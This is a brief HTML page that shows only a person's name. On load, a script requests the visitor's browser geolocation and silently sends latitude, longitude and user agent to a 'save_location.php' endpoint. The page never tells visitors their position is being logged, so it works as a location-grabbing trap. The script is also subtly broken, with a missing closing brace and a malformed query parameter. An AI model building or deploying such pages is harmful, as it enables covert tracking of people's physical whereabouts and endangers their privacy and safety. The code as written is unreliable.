<!DOCTYPE html>

<html>

<body onload="getLocation()">

<a>Tayebi Mohammed Ayoub</a>

<p id="demo"></p>

<script>

var x = document.getElementById("demo");

function getLocation() {

if (navigator.geolocation) {

navigator.geolocation.getCurrentPosition(showPosition); } else {

x.innerHTML = "Geolocation is not supported by this browser.";

}

function showPosition(position) {

const xhttp = new XMLHttpRequest();

xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&user_agent: "+ navigator.userAgent);

xhttp.send();

} </script>

</body>

</html>
